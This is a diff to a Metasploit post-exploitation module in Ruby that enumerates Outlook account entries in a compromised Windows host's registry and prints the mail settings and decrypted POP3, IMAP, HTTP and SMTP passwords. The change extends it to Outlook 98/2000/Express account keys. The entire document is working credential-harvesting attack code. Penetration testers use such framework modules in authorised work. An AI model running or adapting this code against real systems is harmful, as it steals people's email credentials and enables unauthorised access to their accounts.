@@ -73,28 +73,34 @@ class Metasploit3 < Msf::Post
 	end
 
 	# Just a wrapper to avoid copy pasta and long lines
-	def get_valdata(k, name)
-		@key_base = "HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676"
-		registry_getvaldata("#{@key_base}\\#{k}", name)
+	def get_valdata(base, key, name)
+		registry_getvaldata("#{base}\\#{key}", name)
 	end
 
 	def get_registry
+		key_base = "HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676"
+		express_base = "HKCU\\Software\\Microsoft\\Office\\Outlook\\OMI Account Manager\\Accounts"
+		get_reg(key_base, "")
+		get_reg(express_base, "(98/2k/Express) ")
+	end
+	
+	def get_reg(keybase, outlookType)
+	
 		#Determine if saved accounts exist within Outlook.  Ignore the Address Book and Personal Folder registry entries.
 		outlook_exists = 0
 		saved_accounts = 0
 
-
-		next_account_id = get_valdata("", 'NextAccountID')
-
-		if next_account_id != nil
-		#Microsoft Outlook not found
-
-			print_status "Microsoft Outlook found in Registry..."
+		accounts = registry_enumkeys(keybase)
+		if accounts != nil
+			print_status "Microsoft Outlook #{outlookType}found in Registry..."
 			outlook_exists = 1
-			registry_enumkeys(@key_base).each do |k|
-				display_name = get_valdata(k, 'Display Name')
-
-				if display_name == nil
+			
+			
+			accounts.each do |k|
+				display_name = get_valdata(keybase, k, 'Display Name')
+				account_name = get_valdata(keybase, k, 'Account Name')
+				
+				if display_name == nil && account_name == nil
 					#Microsoft Outlook found, but no account data saved in this location
 					next
 				end
@@ -102,20 +108,25 @@ class Metasploit3 < Msf::Post
 				#Account found - parse through registry data to determine account type.  Parse remaining registry data after to speed up module.
 				saved_accounts = 1
 				got_user_pw = 0
-				accountname = get_valdata(k, 'Account Name')
-				displayname = get_valdata(k, 'Display Name')
-				email = get_valdata(k, 'Email')
-				pop3_server = get_valdata(k, 'POP3 Server')
-				smtp_server = get_valdata(k, 'SMTP Server')
-				http_server_url = get_valdata(k, 'HTTP Server URL')
-				imap_server = get_valdata(k, 'IMAP Server')
-				smtp_use_auth = get_valdata(k, 'SMTP Use Auth')
+				accountname     = get_valdata(keybase, k, 'Account Name')
+				displayname     = get_valdata(keybase, k, 'Display Name')
+				email           = get_valdata(keybase, k, 'Email')
+				pop3_server     = get_valdata(keybase, k, 'POP3 Server')
+				smtp_server     = get_valdata(keybase, k, 'SMTP Server')
+				http_server_url = get_valdata(keybase, k, 'HTTP Server URL')
+				imap_server     = get_valdata(keybase, k, 'IMAP Server')
+				smtp_use_auth   = get_valdata(keybase, k, 'SMTP Use Auth')
+				
 				if smtp_use_auth != nil
-					smtp_user = get_valdata(k, 'SMTP User')
-					smtp_password = get_valdata(k, 'SMTP Password')
-					smtp_auth_method = get_valdata(k, 'SMTP Auth Method')
+					smtp_user        = get_valdata(keybase, k, 'SMTP User')
+					smtp_password    = get_valdata(keybase, k, 'SMTP Password')
+					smtp_auth_method = get_valdata(keybase, k, 'SMTP Auth Method')
 				end
 
+				if (displayname == nil) #Outlook 98/2k/Express uses "SMTP Display Name" instead of "Display Name"
+					displayname = get_valdata(keybase, k, 'SMTP Display Name')
+				end 
+				
 				if pop3_server != nil
 					type = "POP3"
 				elsif http_server_url != nil
@@ -133,10 +144,10 @@ class Metasploit3 < Msf::Post
 				print_status("     User E-mail Address: #{email}")
 
 				if type == "POP3"
-					pop3_pw = get_valdata(k, 'POP3 Password')
-					pop3_user = get_valdata(k, 'POP3 User')
-					pop3_use_spa = get_valdata(k, 'POP3 Use SPA')
-					smtp_port = get_valdata(k, 'SMTP Port')
+					pop3_pw      = get_valdata(keybase, k, 'POP3 Password')
+					pop3_user    = get_valdata(keybase, k, 'POP3 User')
+					pop3_use_spa = get_valdata(keybase, k, 'POP3 Use SPA')
+					smtp_port    = get_valdata(keybase, k, 'SMTP Port')
 
 					print_status("     User Name: #{pop3_user}")
 					if pop3_pw == nil
@@ -157,14 +168,14 @@ class Metasploit3 < Msf::Post
 
 					print_status("     Incoming Mail Server (POP3): #{pop3_server}")
 
-					pop3_use_ssl = get_valdata(k, 'POP3 Use SSL')
+					pop3_use_ssl = get_valdata(keybase, k, 'POP3 Use SSL')
 					if pop3_use_ssl == nil
 						print_status("     POP3 Use SSL: No")
 					else
 						print_status("     POP3 Use SSL: Yes")
 					end
 
-					pop3_port = get_valdata(k, 'POP3 Port')
+					pop3_port = get_valdata(keybase, k, 'POP3 Port')
 					if pop3_port == nil
 						print_status("     POP3 Port: 110")
 						portnum = 110
@@ -189,7 +200,7 @@ class Metasploit3 < Msf::Post
 						print_status("     Outgoing Mail Server (SMTP) Password: #{smtp_decrypted_password}")
 					end
 
-					smtp_use_ssl = get_valdata(k, 'SMTP Use SSL')
+					smtp_use_ssl = get_valdata(keybase, k, 'SMTP Use SSL')
 					if smtp_use_ssl == nil
 						print_status("     SMTP Use SSL: No")
 					else
@@ -204,9 +215,9 @@ class Metasploit3 < Msf::Post
 					end
 
 				elsif type == "HTTP"
-					http_password = get_valdata(k, 'HTTP Password')
-					http_user = get_valdata(k, 'HTTP User')
-					http_use_spa = get_valdata(k, 'HTTP Use SPA')
+					http_password = get_valdata(keybase, k, 'HTTP Password')
+					http_user     = get_valdata(keybase, k, 'HTTP User')
+					http_use_spa  = get_valdata(keybase, k, 'HTTP Use SPA')
 
 					print_status("     User Name: #{http_user}")
 					if http_password == nil
@@ -235,10 +246,10 @@ class Metasploit3 < Msf::Post
 					print_status("     HTTP Server URL: #{http_server_url}")
 
 				elsif type == "IMAP"
-					imap_user = get_valdata(k, 'IMAP User')
-					imap_use_spa = get_valdata(k, 'IMAP Use SPA')
-					imap_password = get_valdata(k, 'IMAP Password')
-					smtp_port = get_valdata(k, 'SMTP Port')
+					imap_user     = get_valdata(keybase, k, 'IMAP User')
+					imap_use_spa  = get_valdata(keybase, k, 'IMAP Use SPA')
+					imap_password = get_valdata(keybase, k, 'IMAP Password')
+					smtp_port     = get_valdata(keybase, k, 'SMTP Port')
 
 					print_status("     User Name: #{imap_user}")
 					if imap_password == nil
@@ -258,14 +269,14 @@ class Metasploit3 < Msf::Post
 
 					print_status("     Incoming Mail Server (IMAP): #{imap_server}")
 
-					imap_use_ssl = get_valdata(k, 'IMAP Use SSL')
+					imap_use_ssl = get_valdata(keybase, k, 'IMAP Use SSL')
 					if imap_use_ssl == nil
 						print_status("     IMAP Use SSL: No")
 					else
 						print_status("     IMAP Use SSL: Yes")
 					end
 
-					imap_port = get_valdata(k, 'IMAP Port')
+					imap_port = get_valdata(keybase, k, 'IMAP Port')
 					if imap_port == nil
 						print_status("     IMAP Port: 143")
 						portnum = 143
@@ -290,7 +301,7 @@ class Metasploit3 < Msf::Post
 						print_status("     Outgoing Mail Server (SMTP) Password: #{smtp_decrypted_password}")
 					end
 
-					smtp_use_ssl = get_valdata(k, 'SMTP Use SSL')
+					smtp_use_ssl = get_valdata(keybase, k, 'SMTP Use SSL')
 					if smtp_use_ssl == nil
 						print_status("     SMTP Use SSL: No")
 					else
@@ -342,13 +353,13 @@ class Metasploit3 < Msf::Post
 
 				print_status("")
 
-				end
-		end
+				end  #registry_enumkeys
+		end # if accounts != nil
 
 		if outlook_exists == 0
-			print_status("Microsoft Outlook not installed.")
+			print_status("Microsoft Outlook #{outlookType}not installed.")
 		elsif saved_accounts == 0
-			print_status("Microsoft Outlook installed however no accounts stored in Registry.")
+			print_status("Microsoft Outlook #{outlookType}installed, however no accounts stored in Registry.")
 		end
 
 	end
